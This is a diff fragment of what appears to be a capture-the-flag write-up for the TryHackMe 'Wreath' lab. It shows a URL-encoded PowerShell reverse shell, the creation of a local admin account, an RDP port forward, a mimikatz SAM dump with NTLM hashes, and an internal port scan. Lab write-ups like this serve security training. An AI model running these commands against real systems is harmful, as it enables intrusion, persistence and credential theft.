@@ -157,7 +157,62 @@ Content-Length: 816
 
 a=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.85.200%27%2C23456%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
 
-
+<h2>Task 21  Git Server Stabilisation & Post Exploitation<\h2>
  
+PS C:\GitStack\gitphp> net user duke duke159* /add
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net localgroup Administrators duke /add
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net localgroup "Remote Management Users" duke /add
+The command completed successfully.
+
+Set portforwarding for RDP service
+
+┌──(duke㉿kali)-[~/Documents/THM_Wreath]
+└─$ ssh -L 33389:10.200.85.150:3389  -i root root@10.200.85.200 -N
+
+use remina 127.0.0.1:33389
+
+copy and run mimikatz
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+mimikatz # lsadump::sam
+Domain : GIT-SERV
+SysKey : 0841f6354f4b96d21b99345d07b66571
+Local SID : S-1-5-21-3335744492-1614955177-2693036043
+
+SAMKey : f4a3c96f8149df966517ec3554632cf4
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
+
+get administrator and tomas hash
+
+<h2>Task 33  Personal PC Enumeration </h2>
+
+on 10.200.85.150 upload ps and run
+
+PS C:\Users\duke\Documents> Invoke-Portscan -Hosts 10.200.85.100 -TopPorts 50
+
+
+Hostname      : 10.200.85.100
+alive         : True
+openPorts     : {80, 3389}
+closedPorts   : {}
+filteredPorts : {445, 443, 21, 23...}
+finishTime    : 30/01/2024 10:32:15
+
+
+
 </code>
 
